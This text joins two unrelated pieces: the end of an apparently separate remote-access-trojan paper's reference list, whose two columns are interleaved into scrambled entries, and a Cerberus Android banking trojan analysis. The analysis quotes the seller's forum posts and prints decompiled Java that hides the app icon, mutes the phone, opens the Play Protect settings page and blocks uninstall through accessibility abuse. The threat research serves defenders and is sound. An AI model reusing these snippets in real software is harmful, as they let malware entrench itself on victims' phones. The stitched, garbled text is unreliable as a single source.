+tions Available: https://hackforums.net/showthread.php?tid=5621975&hig
+
+hlight=Webmonitor
+[15] Cyware, “Adwind rat: An insight into the remote access trojan’s
+
+malicious activities,” accessed on March 6, 2020. [Online]. Available: [34] CyberGate RAT COMPLETE TUTORIAL, accessed on May 31,
+https://cyware.com/news/adwind-rat-an-insight-into-the-remote-acce 2020. [Online]. Available: https://atjeh-vb6.blogspot.com/2013/05/c
+ss-trojans-malicious-activities-965b128f ybergate-rat-complete-tutorial.html
+
+[16] Check Point Research, Operation Tripoli, accessed on March 6, [35] NetWire Product Overview, accessed on May 31, 2020. [Online].
+2020. [Online]. Available: https://research.checkpoint.com/2019/ope Available: https://www.worldwiredlabs.com/documents/NetWire%2
+ration-tripoli/ 0User%20Manual.pdf
+
+[17] Kaspersky GReAT, “Fully equipped spying android rat from [36] “Business email compromise (bec),” accessed on March 7, 2020.
+brazil: Brata,” accessed on March 6, 2020. [Online]. Available: [Online]. Available: https://www.trendmicro.com/vinfo/us/security/d
+https://securelist.com/spying-android-rat-from-brazil-brata/92775/ efinition/business-email-compromise-(bec)
+
+[37] I. Ilascu, Nigerian BEC Scammers Shifting to RATs As Tool
+[18] B. N, “Hackers launching macos malware via fake whatsapp of Choice, accessed on March 7, 2020. [Online]. Available:
+
+l website,” accessed on March 6, 2020. [Online]. Available: https://www.bleepingcomputer.com/news/security/nigerian-bec-scam
+https://gbhackers.com/hackers-launching-unique-macos-malware/ mers-shifting-to-rats-as-tool-of-choice/
+
+[19] W. Ali, “Cybergate rat - hacking facebook, twitter and email [38] K. Zykov, Hello! My name is Dtrack, accessed on March 7, 2020.
+id’s passwords,” accessed on March 6, 2020. [Online]. Available: [Online]. Available: https://securelist.com/my-name-is-dtrack/93338/
+http://www.hackersthirst.com/2011/03/cybergate-rat-hacking-facebo
+ok-twitter.html [39] J. Miller-Osborn and M. Harbison, Rancor: Cyber Espionage Group
+
+Uses New Custom Malware to Attack Southeast Asia, accessed on
+[20] J. T. B. Nart Villeneuve, “Xtremerat: Nuisance or threat?” accessed March 7, 2020. [Online]. Available: https://unit42.paloaltonetworks.
+
+on March 6, 2020. [Online]. Available: https://www.fireeye.com/blo com/rancor-cyber-espionage-group-uses-new-custom-malware-to-at
+g/threat-research/2014/02/xtremerat-nuisance-or-threat.html tack-southeast-asia/
+
+[21] MalwareMustDie, “Mmd-0031-2015 - what is netwire (multi [40] P. R. Warren Mercer and V. Ventura, Bisonal: 10 years of
+platform) rat?” accessed on March 6, 2020. [Online]. Available: play, accessed on March 7, 2020. [Online]. Available: https:
+https://blog.malwaremustdie.org/2015/04/mmd-0031-2015-what-is- //blog.talosintelligence.com/2020/03/bisonal-10-years-of-play.html
+netwire-rat.html
+
+[41] M. Mimoso, AutoIt Used in Targeted Attacks to Move RATs,
+[22] T. Seals, “Authorities break up imminent monitor spyware accessed on March 7, 2020. [Online]. Available: https://threatpost.c
+
+organization,” accessed on March 6, 2020. [Online]. Available: om/autoit-used-in-targeted-attacks-to-move-rats/114406/4/
+https://threatpost.com/authorities-imminent-monitor-spyware-organi
+zation/150731/ [42] Netwire RAT Behind Recent Targeted Attacks, accessed on March 7,
+
+2020. [Online]. Available: https://www.kashifali.ca/2015/03/02/netw
+[23] Palo Alto Unit42, “Imminent monitor – a rat down under,” accessed ire-rat-behind-recent-targeted-attacks/
+
+on March 6, 2020. [Online]. Available: https://unit42.paloaltonetwo
+rks.com/imminent-monitor-a-rat-down-under/ [43] C. Cimpanu, Authorities take down ’Imminent Monitor’ RAT
+
+malware operation, accessed on March 7, 2020. [Online]. Available:
+[24] K. Poulsen, “Fbi arrests hacker who hacked no one,” accessed on https://www.zdnet.com/article/authorities-take-down-imminent-mon
+
+March 6, 2020. [Online]. Available: https://www.thedailybeast.com/ itor-rat-malware-operation/
+fbi-arrests-hacker-who-hacked-no-one
+
+[44] M. Baezner, Regional rivalry between India-Pakistan: tit-for-tat
+[25] J. Grunzweig, “Investigating the luminositylink remote access trojan in cyberspace, accessed on March 7, 2020. [Online]. Available:
+
+configuration,” accessed on March 6, 2020. [Online]. Available: https://css.ethz.ch/content/dam/ethz/special-interest/gess/cis/center-fo
+https://unit42.paloaltonetworks.com/unit42-investigating-the-luminos r-securities-studies/pdfs/Cyber-Reports-2018-04.pdf
+itylink-remote-access-trojan-configuration/ [45] M. Kumar, Exclusive: German Police Raid OmniRAT Developer
+
+[26] B. Krebs, “‘luminositylink rat’ author pleads guilty,” accessed on and Seize Digital Assets, accessed on March 7, 2020. [Online].
+March 6, 2020. [Online]. Available: https://krebsonsecurity.com/20 Available: https://thehackernews.com/2019/06/police-raid-omnirat-
+18/07/luminositylink-rat-author-pleads-guilty/ developer.html
+
+
+
+[46] F. B. Jr. and J. Salvio, German Speakers Targeted by SPAM Leading
+to Ozone RATFloser Bacurio Jr. and Joie Salvio, accessed on March
+7, 2020. [Online]. Available: https://www.fortinet.com/blog/threat-res
+earch/german-speakers-targeted-by-spam-leading-to-ozone-rat.html
+
+[47] Remcos RAT Abuses Office Vulnerabilities to Target Businesses,
+accessed on March 7, 2020. [Online]. Available: https://www.enig
+masoftware.com/remcos-rat-abuses-office-vulnerabilities-target-bus
+inesses/
+
+[48] R. Abel, Spynote RAT posing as Netflix plus other popular
+apps, accessed on March 7, 2020. [Online]. Available: https:
+//www.scmagazine.com/home/security-news/cybercrime/spynote-rat
+-posing-as-netflix-plus-other-popular-apps/
+
+[49] S. Desai, SpyNote RAT posing as Netflix app, accessed on March 7,
+2020. [Online]. Available: https://www.zscaler.com/blogs/research/s
+pynote-rat-posing-netflix-app
+
+[50] “Github development platform.” [Online]. Available: https://github.c
+om/
+
+
+
+ 
+
+ 
+
+C 
+
+ 
+
+ 
+
+  
+
+  
+
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+
+CERBERUS BANKING TROJAN 
+ANALYSIS 
+
+ 
+
+
+
+Cerberus Banking Trojan Analysis 
+
+Disclaimer 
+
+All information contained in this document is public information and researched by Cyberwise Researchers. Disclosure or use of 
+any information contained in this document by photographic, electronic or any other means, in whole or part, for any reason other 
+is strictly prohibited without written consent. Cyberwise shall assume no liability for any changes, omissions, or errors in this 
+document. All the recommendations are provided on as is basis and are void of any warranty expressed or implied. 
+
+Cyberwise Research Task Force 
+
+• Ali Rıza Şahinkaya 
+• Can Atakan Işık 
+• Rıdvan Ethem Canavar 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+
+
+Cerberus Banking Trojan Analysis 
+
+TABLE OF CONTENTS 
+
+ 
+Executive Summary ............................................................................................................................................................ . 
+
+ Introduction ............................................................................................................................................................... 1 
+ Cerberus Developers and Their Operation ................................................................................................................. 2 
+ Cerberus Clients and Their Operations ....................................................................................................................... 4 
+ Evolution of Cerberus Malware .................................................................................................................................. 5 
+ Technical Analysis ...................................................................................................................................................... 7 
+
+ Anti-Analysis Techniques ....................................................................................................................................... 7 
+ Persistence ............................................................................................................................................................ 7 
+ Gaining Accessibility Permission .......................................................................................................................... 12 
+ Abusing Accessibility ............................................................................................................................................ 14 
+ What We Know About The Command & Control Server ....................................................................................... 17 
+ Gathering Device Information .............................................................................................................................. 20 
+ Downloaded Module ........................................................................................................................................... 22 
+ Remote Control ................................................................................................................................................... 22 
+ Grabber ............................................................................................................................................................... 24 
+
+ Dialer - SMS Interception ..................................................................................................................................... 25 
+ Remote App Removal and Self Destruction .......................................................................................................... 27 
+
+ Mitigation and Countermeasures ............................................................................................................................. 28 
+ Future of Cerberus ................................................................................................................................................... 29 
+ Sources .................................................................................................................................................................... 30 
+
+Appendix.A – Count of Detected Cerberus - Daily ............................................................................................................. 31 
+Appendix.B – Known Injection List ................................................................................................................................... 32 
+Appendix.C – IoC Table ..................................................................................................................................................... 34 
+Appendix.D – Turkish Banks Injection Overlays ................................................................................................................ 36 
+ 
+
+ 
+
+  
+
+ 
+
+
+
+Cerberus Banking Trojan Analysis 
+
+Executive Summary 
+Today’s cyber world is swarming full of mobile devices. Each day more and more companies are starting to use mobile devices. 
+With this rising trend in usage of mobile devices and applications, this landscape became one of the main concerns in cyber security 
+area. In this report we will be giving in-depth information about a specific malware targeting banking apps. Fortunately, if correct 
+mitigations and countermeasures are applied, these fraud attempts and violations can be acknowledged and prevented 
+beforehand. 
+ 
+Banking-Trojan: Malicious apps or sites specifically targeting banking sites and apps. 
+
+Injections: Injections can be described as ‘overlays mimicking target app or site in order to gain trust of the user’. For Banking-
+Trojans injections are used to mimic banks login screens, this usage of injections aims to gain users trust by faking the real bank 
+application. 
+
+Overlay: One can describe overlays as ‘a new layer set between user and real application login screen. 
+ 
+In our research, we discovered groups particularly targeting Turkish banks via using Banking-Trojans. With usage of this malicious 
+application, they are capable of stealing user credentials such as credit card numbers, citizen number, banking credentials etc. 
+After acquiring victim’s information, these groups are using obtained credentials to withdraw money from victims’ bank. 
+
+In Federal Bureau of Investigation’s documentation1 alone, a near loss of $3.000.000.000 reported in the past year over through 
+Internet crimes. In our research we were also able to confirm that, there are many victims from Turkey still using infected devices 
+actively. Each of these individuals are getting target based on their used mobile banking applications. 
+
+Within this new era even the devices we carry all day long with us is not secure if they are not managed and secured properly. 
+Investigation of this specific attack surface can reduce economical damage dramatically by all means. Also, it should be mentioned 
+that investigation and addressing of these targeted fraud attempts is in both favour of companies and their customers. 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+1 https://pdf.ic3.gov/2019_IC3Report.pdf 
+
+ 
+
+
+
+Cerberus Banking Trojan Analysis 
+
+ 
+
+ Introduction 
+With the start of the global pandemic, actors started distributing malicious codes to internet using pandemic related apps / sites. 
+One of the specific rising attack vectors related to this new event is Banking-Trojans. Some groups started targeting specific 
+countries and sectors with the new-normal. Actors are distributing their malware with a simple methodology, promising free aid / 
+money or in some cases only data related to current COVID-19 situation. As research suggest some of these actors are specifically 
+targeting Turkish citizens / banks and causing massive amounts of economic damage.  
+ 
+
+ 
+Figure 1.1 Example Website Template Related to Fraud 
+
+ 
+
+Banking-Trojans can be described as malwares specifically targeting apps or sites directly related to the banks themselves, but new 
+generation Banking-Trojans are much more capable than that. With this new generation Banking-Trojans actors are not only 
+compromising users’ credentials for bank accounts but also acquiring full control of the victims’ phone. In this research we will be 
+investigating one of the most powerful Android Banking-Trojan ever made until now, called ‘Cerberus’. 
+
+Cerberus malware’s first version was detected back in June 2019 by security researchers hence the developers claimed that it was 
+used for 2 years ‘privately’. Cerberus can be categorized as MaaS (Malware-as-a-Service). Developers also claimed that they 
+created the malware from scratch, unlike other Banking-Trojans in the wild Cerberus is not built on an existing malware they claim. 
+It uses a similar procedure used in most of the banking trojans known as phishing via usage of overlays. It has some unseen features 
+compared to the previous Android banking trojans. One of the most interesting features is; when bot is deployed after acquiring 
+accessibility rights, bot just abuses accessibility functions to give itself more permissions and perform some action commands 
+received from the C2. 
+
+In our research we were able to detect more than 160 effected applications by Cerberus injection overlays. These injections are 
+targeting a large usage area including social media, communication apps and foremost mobile banking applications. For public 
+safety / awareness we are publishing the list of injection overlays in this paper.  
+
+For injection list please visit Appendix.B 
+  
+
+Public  I  1 
+
+
+
+Cerberus Banking Trojan Analysis 
+
+ Cerberus Developers and Their Operation 
+In June 2019, a user called 'ANDROID' started a thread called Cerberus in xxs[.]is, a well-known Russian underground forum. In 
+thread they claimed that they were selling a new generation, written from scratch Android malware. 
+ 
+
+ 
+Figure 2.1 Initial Post, retrieved from xss[.]is 
+
+ 
+
+As a MaaS product they were ‘renting’ this service to their customer from a base price starting at $4.000. With this initial post they 
+also posted first generation bot’s features. 
+
+ 
+• Sending SMS 
+• 2FA grabber 
+• Interception SMS 
+• Hidden interception of SMS 
+• Device lock 
+• Mute sound 
+• Keylogger (messengers, watts app, telegram secret, banks, etc., except browsers!) 
+• Execution of USSD commands 
+• Call Forwarding 
+• Opening the fake page of the bank 
+• Run any installed application 
+• Push Bank Notification (Auto Push - determines which bank is installed) 
+• Open URL in browser 
+• Get all installed applications 
+• Get all the contacts of their phone book 
+• Get all saved SMS 
+• Remove any application 
+• Self-destruct bot 
+• Automatic confirmation of rights and permissions 
+• A bot can have several spare url to connect to the server 
+• Injects (html + js + css, download to the device and run from disk, poor connection or lack of internet 
+
+will not affect the operation of injects) 
+• Grabber cards 
+• Grabber mail 
+• Automatic inclusion of injections through the time specified in the admin panel 
+• Automatically shut off Google Play Protect + disconnect after the time specified in the admin panel 
+• Anti-emulator (Bot starts working after device activity) 
+
+Figure 2.2 Initial Bot Features, retrieved from xss[.]is 
+
+ 
+
+In the initial post they also mentioned parameters sent by the bots to C2. 
+  
+
+Public  I  2 
+
+
+
+Cerberus Banking Trojan Analysis 
+
+ 
+Figure 2.3 Initial Bot Parameters, retrieved from xss[.]is 
+
+ 
+
+This post also had some insight features related to the Administration Panel. 
+ 
+
+ 
+Figure 2.4 Administration Panel Features, retrieved from xss[.]is 
+
+ 
+
+Developers were also cautious about bots' secrecy. A client was constantly uploading the new-build Cerberus examples to an 
+antivirus site. They immediately revoked the licence of that client. 
+
+ 
+
+ 
+Figure 2.5 Revoking a Client’s License, retrieved from xss[.]is 
+
+  
+
+Public  I  3 
+
+
+
+Cerberus Banking Trojan Analysis 
+
+ Cerberus Clients and Their Operations 
+Cerberus clients main concern was distributing and using the malware as efficiently as possible. They also said, ‘we are short on 
+injections depending on different countries.’. Mainly Cerberus clients were paying third parties for their injection kits and proxy 
+server related problems. Because of this demand situation developers stated that they prepared injection kits for most affected 
+countries and most viable customers. They also prepared a special offer for a period of time. 
+ 
+
+ 
+Figure 3.1 Injection Kits Made by Developers, retrieved from xss[.]is 
+
+ 
+
+After some time in the market developers made a public announcement stating their operational capacity is full, so no license will 
+be distributed until someone else's expires. It is observed that they had specific groups / partners targeting specific countries. 
+ 
+
+EN 
+And so, I hasten to inform you that we are going into private. 
+From this moment on, the sale of the bot is suspended, and we will sell it only upon the availability of 
+vacant seats. 
+We have recruited a base of paying clients who work as a bot correctly. Many who ruined the lives of others 
+left without extending the lease, for some we did not extend the lease, since they did not know how to 
+work with apk. 
+If you have any questions about the bot, write in private messages. 
+We will publish information about updates to keep the topic up to date. 
+RU 
+И так, спешу вам сообщить, что мы уходим в приват. 
+С этого момента продажи бота приостанавливаются, и мы будем продавать его только по наличию 
+освободившихся мест. 
+Мы набрали базу платёжеспособных клиентов, которые правильно работают ботом. Многие, кто 
+портил жизнь другим ушли, не продливая аренду, некоторым аренду не продлили мы, так как они не 
+умели работать с апк. 
+Если у вас есть вопросы по боту, пишите в личные сообщения. 
+Информацию об обновлениях будем публиковать, чтобы поддерживать тему актуальнной. 
+
+Figure 3.2 Developers Going Private, retrieved from xss[.]is 
+  
+
+Public  I  4 
+
+
+
+Cerberus Banking Trojan Analysis 
+
+ Evolution of Cerberus Malware 
+On April 3 2020, developers of Cerberus announced Cerberus v2. They also stated that if clients are currently a subscriber for 
+Cerberus v1.0, clients can upgrade it to Cerberus v2.0 freely.  
+
+Some of eye-catching newly added functions are; 
+ 
+
+• Added 2FA grabber from Google Authenticator. 
+• Keylogger now successfully reads information from push notifications. (for banks with 2FA) 
+• Cerberus v2.0 is capable of disabling Google Play Protect by itself. 
+• Fundamental change in injection process and usability.  
+• New functions are added to prevent antivirus detection. 
+
+ 
+Cerberus v2 relesed in an open test for our customers. 
+Support v1 will be relevant until May 1. After all the old panels will stop working. 
+Switching to v2 is free 
+ 
+List of changes: 
+
+• The logic of the bot has been rewritten almost from scratch, now antivirus companies will not be 
+able to kill bots with groups of play protect so easily 
+
+• The admin rights on Samsung are fixed, and their receipt on all devices (Except Xiaomi). Admin 
+rights are needed to lock the phone 
+
+• The injection system has been changed, now the injections are all in the same table, and there are 
+no grabCC and grabMails. Each application has its own injection. Backward compatibility with old 
+injections saved. 
+
+• In the injection system, resource loading from outside is now available. You can embed images 
+from the url in the html file, and also load css styles from third-party resources. Previously, we 
+removed this feature, and injections with similar functionality did not work. 
+
+• Added 2FA grabber from google authenticator 
+• Added send SMS to all accounts 
+• Added support for Android 10 
+• Fixed hiding SMS on most devices 
+• Keylogger now successfully reads information from push notifications (for banks with 2FA) 
+• Moved the builder to the panel 
+• Updates are now automatically installed on your server. 
+• Fixed problems with the "lags" of the panel. Now the panel stably works with 5000 online bots 
+
+(with 12 GB of RAM) 
+• Added support for more than 64 additional domains for the bot. Prior to this, bots did not see 
+
+additional domains, if there are more than 64 of them. 
+• Departure from apache2 on the server side towards performance. Now everything works on nginx. 
+• Removed getting "extra" rights. The victim will now have fewer pop-ups. 
+• Added another method to protect against bot removal 
+• Hidden main module on the victim's phone. Now, antivirus companies won’t know at all that the 
+
+victim’s phone has a bot based on module signatures. 
+ 
+Addition for clients: during v2 tests we had a working build leaked and anti-virus bots got into the panel. 
+Play Protect was turned off on all phones. Conclusion - disabling Play Protect does not affect the operation 
+of the bot. 
+There are also many convenient changes in the panel for good usability. 
+Also, over time, we will add various functionality for obtaining information from popular applications 
+(example 2FA). 
+This is done for free if many clients need it. 
+We do not change the pricing policy due to lack of funds from our customers. 
+Wash your hands, keep your distance ^_^ 
+
+Figure 4.1 Post Related to Release of Cerberus v2, retrieved from xss[.]is 
+
+ 
+
+With the new version of Cerberus users are able to create their own injections from the admin panel. 
+  
+
+Public  I  5 
+
+
+
+Cerberus Banking Trojan Analysis 
+
+ 
+Figure 4.2 Injection Generator from The Admin, retrieved from xss[.]is 
+
+ 
+
+They also published some example injections made by them. Real apps’ fonts and app images were used by Cerberus developers 
+to make it look like the real apps window. 
+
+ 
+
+ 
+Figure 4.3 Example Injections Published by Developers, retrieved from xss[.]is 
+
+ 
+  
+
+Public  I  6 
+
+
+
+Cerberus Banking Trojan Analysis 
+
+ Technical Analysis 
+In this section, we will talk about malwares’ technical analysis. For sole purpose of analysing Cerberus malware, we have written 
+scripts mainly focusing analysis of Cerberus. Developed scripts are able to get config variables of the malware statically. Tools made 
+for this research can be found on GitHub. 
+ 
+https://github.com/ics-iot-bootcamp/cerberus_research 
+ 
+Third-party tools used in this research is shown in Figure 5.1. 
+ 
+
+Apktool Wireshark ADB Androguard 
+Byte Code Viewer JD-GUI NetBeans 8.1 
+
+Figure 5.1 Third-Party Tools 
+ 
+
+ Anti-Analysis Techniques 
+
+Most of Cerberus samples examined in the research were dropped by a dropper. Obfuscated dropper contains junk code and 
+unrelated files from random applications alongside its main code to confuse analysts and security software. In result, it basically 
+uses XOR cipher to decrypt its strings including name of the file to be loaded and the decryption key. 
+
+Droppers RC4 implementation takes file name and decryption key and decrypts the RC4 encrypted file in its “assets/” directory. 
+The resulting DEX file is loaded with the help of DexClassLoader method (Compilation is performed by ART's dex2oat tool) and 
+then actual Cerberus code invoked. 
+
+Actual Cerberus code is not heavily obfuscated. It contains junk classes, but the actual code is fine. Strings in actual Cerberus code 
+are encrypted with RC4 and they are decrypted in runtime. 
+
+ 
+
+ Persistence 
+
+Cerberus hides its own icon after launch, tries to get accessibility permission to use its’ persistence features. For this, it sets an 
+alarm to be triggered every 1 second. Whenever this alarm is triggered, it checks battery optimization status, status of its services 
+and the availability of accessibility permission. If there is no accessibility permission, it shows a message that redirects to the 
+permission page until this permission is granted by the user. 
+
+Accessibility permission is particularly important for Cerberus, as all of its core functions are based on exploiting this feature. After 
+obtaining the accessibility permission, it opens and approves other permission pages itself. 
+
+If the user goes to the Android's setting page to remove features that would interfere with Cerberus's operation, Cerberus exploits 
+accessibility, presses the back key and removes the user from the setting page and reports removal attempt to the command 
+control. 
+ 
+ 
+
+Hiding app icon to avoid getting noticed by the user: 
+
+1. public static void _enableConfigXMLComponent(Context var0) { 
+2.   ComponentName cn = new ComponentName(var0, _ENTRYPOINTConfigXML.class); 
+3.   var0.getPackageManager().setComponentEnabledSetting(cn, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, 
+
+PackageManager.DONT_KILL_APP); 
+4. } 
+
+Figure 5.2.1 Java Code 
+
+ 
+
+  
+
+Public  I  7 
+
+
+
+Cerberus Banking Trojan Analysis 
+
+Watchdog Method That Uses AlarmManager: 
+
+1. public static void _startRepeatRequest(Context var0, String var1, long var2) { 
+2.   try { 
+3.      Intent var4 = new Intent(var0, _receiveSMSnStartJobs.class); 
+4.      var4.setAction(var1); 
+5.      PendingIntent var6 = PendingIntent.getBroadcast(var0, 0, var4, 0); 
+6.       ((AlarmManager)var0.getSystemService("alarm")).setRepeating(0, System.currentTimeMillis() + var2, var2, 
+
+var6); 
+7.   }catch (Exception var5) { 
+8.       var5.printStackTrace(); 
+9.    } 
+10. } 
+
+Figure 5.2.2 Java Code 
+
+ 
+
+Call to Watchdog Method: 
+
+1. . 
+2. . 
+3. _Utils._startRepeatRequest(this, "", 10000L); 
+4. this._utils._patcherClassStart((Context)this); 
+5. . 
+6. . 
+
+Figure 5.2.3 Java Code 
+ 
+
+Shows Fullscreen Intent If Accessibility Permission Not Present: 
+
+1. . 
+2. . 
+3. Notification var9 = var6.setSmallIcon(var7.getIdentifier(var8.toString(), (String)null, (String)null)) 
+4. .setContentTitle(_title) 
+5. .setContentText(_body) 
+6. .setFullScreenIntent(_foreignIntent, true) 
+7. .setOngoing(true) 
+8. .setAutoCancel(true) 
+9. .getNotification(); 
+10. . 
+11. . 
+
+Figure 5.2.4 Java Code 
+
+ 
+
+ 
+Figure 5.2.5 Enable Accessibility 
+
+  
+
+Public  I  8 
+
+
+
+Cerberus Banking Trojan Analysis 
+
+Cerberus uses service code that is not affected by battery optimization settings (battery optimization may cause Cerberus to sleep 
+and stop) and this code is triggered at startup. 
+
+*Research showed that this method was actually copied and pasted from this blog post: 
+https://robertohuertas.com/2019/06/29/android_foreground_services/  
+
+1.    public IBinder onBind(Intent var1) { 
+2.    this.a._logcatError(decryptedStr("EndLess"), decryptedStr("Some component want to bind with the 
+
+service")); 
+3.    return null; 
+4.    } 
+
+Figure 5.2.6 Java Code 
+
+ 
+
+Cerberus can turn off notifications to prevent the user from noticing: 
+
+1. public static void _muteAudio(Context var0) { 
+2.    try { 
+3.      AudioManager var2 = (AudioManager)var0.getSystemService("audio"); 
+4.      var2.setStreamMute(1, true); 
+5.      var2.setStreamMute(3, true); 
+6.      var2.setStreamVolume(4, 0, 0); 
+7.      var2.setStreamVolume(8, 0, 0); 
+8.      var2.setStreamVolume(5, 0, 0); 
+9.      var2.setStreamVolume(2, 0, 0); 
+10.      var2.setVibrateSetting(1, 0); 
+11.   }catch (Exception var1) { 
+12.     } 
+13. } 
+
+Figure 5.2.7 Java Code 
+ 
+
+Cerberus is able to lock the device if it has administrator privileges: 
+
+1. . 
+2. . 
+3. . 
+4. ((DevicePolicyManager)this.getSystemService("device_policy")).lockNow(); 
+5. . 
+6. . 
+7. . 
+
+Figure 5.2.8 Java Code 
+
+ 
+
+Cerberus may try to disable Google Play Protect: 
+
+1. if (_Utils._isAccessibilityServiceEnabled((Context)this, (Class)_accessibilityAbuser.class)  
+2. && _Utils._isKeyguardEnabledBool(this)  
+3. && this._utils._readSharedPreference(this, this._strings._isPlayProtectEnabled).equals(decryptedStr("1"))  
+4. && var11 > Integer.parseInt(this._utils._readSharedPreference(this, this._strings._PlayProtectRelated))){ 
+5.      if (VERSION.SDK_INT >= 25) { 
+6.           this._utils._writeSharedPreference(this, this._strings._triedtoInvokePlayProtectActivity, 
+
+decryptedStr("1")); 
+7.           try{ 
+8.               var1 = new 
+
+Intent(decryptedStr("com.google.android.gms.security.settings.VerifyAppsSettingsActivity")); 
+9.               var1.setClassName(decryptedStr("com.google.android.gms"), 
+
+decryptedStr("com.google.android.gms.security.settings.VerifyAppsSettingsActivity")); 
+10.               var1.addFlags(268435456); 
+11.               var1.addFlags(8388608); 
+12.               this.startActivity(var1); 
+13.           }catch (Exception var21) { 
+14.                 var1 = new 
+
+Intent(decryptedStr("com.google.android.gms.security.settings.VerifyAppsSettingsActivity")); 
+15.                 var1.setClassName(decryptedStr("com.google.android.gms"), 
+
+decryptedStr("com.google.android.gms.security.settings.VerifyAppsSettingsActivity")); 
+16.               this.startActivity(var1); 
+17.            } 
+18.          }  
+19.      else { 
+20.           this._utils._writeSharedPreference(this, this._strings._triedtoInvokePlayProtectActivity, 
+
+decryptedStr("1")); 
+
+Public  I  9 
+
+
+
+Cerberus Banking Trojan Analysis 
+
+21.            var1 = new 
+Intent(decryptedStr("com.google.android.gms.security.settings.VerifyAppsSettingsActivity")); 
+
+22.            var1.setClassName(decryptedStr("com.google.android.gms"), 
+decryptedStr("com.google.android.gms.security.settings.VerifyAppsSettingsActivity")); 
+
+23.            var1.addFlags(268435456); 
+24.            var1.addFlags(8388608); 
+25.            this.startActivity(var1); 
+26.      } 
+27. } 
+
+Figure 5.2.9 Java Code 
+
+ 
+
+If Cerberus has accessibility permission, it prevents the user's deactivation attempts through and reports the attempt to the C2. 
+ 
+Bot may prevent its removal:  
+
+1. if (this.i.contains(this._utils._getApplicationLabel(this).toLowerCase())  
+2. && !this.i.contains(this._strings.I.toLowerCase())){ 
+3.      this._tapGoBack4Times(); 
+4.      var86 = this._utils; 
+5.      var91 = this._strings._SMSRelated; 
+6.      var96 = new StringBuilder(); 
+7.      var96.append(decryptedStr("Blocked attempt to remove bot")); 
+8.      var96.append(decryptedStr("[143523#]")); 
+9.      var86._writeSharedPreferenceAppend(this, var91, var96.toString()); 
+10. } 
+
+Figure 5.2.10 Java Code 
+ 
+
+It can block the removal of the accessibility permission if it is present. (If there is two different Cerberus installed on the device, 
+one of them will be trying to open the accessibility permission page and the other one will block the page from opening) 
+
+1. if (VERSION.SDK_INT > 15  
+2. && decryptedStr("com.android.settings.SubSettings").equals(var1.getClassName())  
+3. && this.i.equals(this._strings._campaignPkgName.toLowerCase())){ 
+4.       this._tapGoBack4Times(); 
+5.       this._utils._writeSharedPreferenceAppend(this, this._strings._SMSRelated, decryptedStr("Blocked attempt to 
+
+disable accessibility service[143523#]")); 
+6. } 
+
+Figure 5.2.11 Java Code 
+
+ 
+It can block the removal of device admin: 
+
+1. if (this.j.equals(decryptedStr("com.android.settings.deviceadminadd"))  
+2. && CerberusNW._Utils._isDeviceAdminActive(this)){ 
+3.      this._tapGoBack4Times(); 
+4.      var86 = this._utils; 
+5.      var6 = this._strings._SMSRelated; 
+6.      var3 = new StringBuilder(); 
+7.      var3.append(decryptedStr("Blocked attempt to disable admin device")); 
+8.      var3.append(decryptedStr("[143523#]")); 
+9.      var86.writeSharedPreferenceAppend(this, var6, var3.toString()); 
+10. } 
+
+Figure 5.2.12 Java Code 
+
+ 
+  
+
+Public  I  10 
+
+
+
+Cerberus Banking Trojan Analysis 
+
+Cerberus can provide remote management with Teamviewer. Therefore, it will also prevent Teamviewer from being removed. 
+
+1. if (this.i.contains(decryptedStr("host"))  
+2. && this._utils._readSharedPreference(this, this._strings.aJ).equals(decryptedStr("true"))){ 
+3.      this._tapGoBack4Times(); 
+4.      var94 = this._utils; 
+5.      var91 = this._strings._SMSRelated; 
+6.      StringBuilder var88 = new StringBuilder(); 
+7.      var88.append(decryptedStr("Blocked attempt to remove TeamViewer")); 
+8.      var88.append(decryptedStr("[143523#]")); 
+9.      var94._writeSharedPreferenceAppend(this, var91, var88.toString()); 
+10. } 
+11. if (var1.getPackageName().toString().contains(decryptedStr("com.google.android.packageinstaller")) && 
+
+this.j.contains(decryptedStr("android.app.alertdialog"))  
+12. && this.i.contains(decryptedStr("host"))  
+13. && this._utils._readSharedPreference(this, this._strings.aJ).equals(decryptedStr("true"))){ 
+14.       this._tapGoBack4Times(); 
+15.       var86 = this._utils; 
+16.       var91 = this._strings._SMSRelated; 
+17.       var96 = new StringBuilder(); 
+18.       var96.append(decryptedStr("Blocked attempt to remove TeamViewer")); 
+19.       var96.append(decryptedStr("[143523#]")); 
+20.       var86._writeSharedPreferenceAppend(this, var91, var96.toString()); 
+21. } 
+
+Figure 5.2.13 Java Code 
+
+ 
+
+Research indicates that some samples are avoiding from running if mobile network country code matches any of listed countries: 
+
+• Ukraine 
+• Russia 
+• Belarus 
+• Tajikistan 
+• Uzbekistan 
+• Turkmenistan 
+• Azerbaijan 
+• Armenia 
+• Kazakhstan 
+• Kyrgyzstan 
+• Moldova 
+
+It should be noted that, all these countries listed above were part of the Soviet Union. 
+
+1. public void onReceive(Context context, Intent object) { 
+2.     Object object2; 
+3.     Object object3; 
+4.     int n; 
+5.     block13 : { 
+6.            try { 
+7.               CharSequence charSequence; 
+8.               if (this.b._readSharedPreference(context, "kill").contains(this.a.aT)) return; 
+9.               if (this.b._isAvoidedCountry(context)) return; 
+10.               this.b._logcatError(this.d, "START >> Boot Receiver"); 
+11.               object3 = this.b; 
+12. . 
+13. . 
+14. . 
+
+Figure 5.2.14 Java Code 
+
+  
+
+Public  I  11 
+
+
+
+Cerberus Banking Trojan Analysis 
+
+ Gaining Accessibility Permission 
+
+The malware creates a html page using the code block shown in Figure 5.3.1.  
+
+1. protected void onCreate(Bundle var1) { 
+2.     super.onCreate(var1); 
+3.     if (_Utils._isAccessibilityServiceEnabled((Context)this, (Class)_accessibilityAbuser.class)) { 
+4.         this.finish(); 
+5.      } 
+6.      String var6; 
+7.      label17: { 
+8.          this.c = new WebView(this); 
+9.          this.c.getSettings().setJavaScriptEnabled(true); 
+10.          this.c.setScrollBarStyle(0); 
+11.          this.c.setWebViewClient(new _accessibilityPermReqUIhtml.b((byte)0)); 
+12.          this.c.setWebChromeClient(new _accessibilityPermReqUIhtml.a((byte)0)); 
+13.          this.c.addJavascriptInterface(new _accessibilityPermReqUIhtml.WebAppInterface(this), 
+
+decryptedStr("Android")); 
+14.          StringBuilder var5 = new StringBuilder(); 
+15.          var5.append(this._strings.bc); 
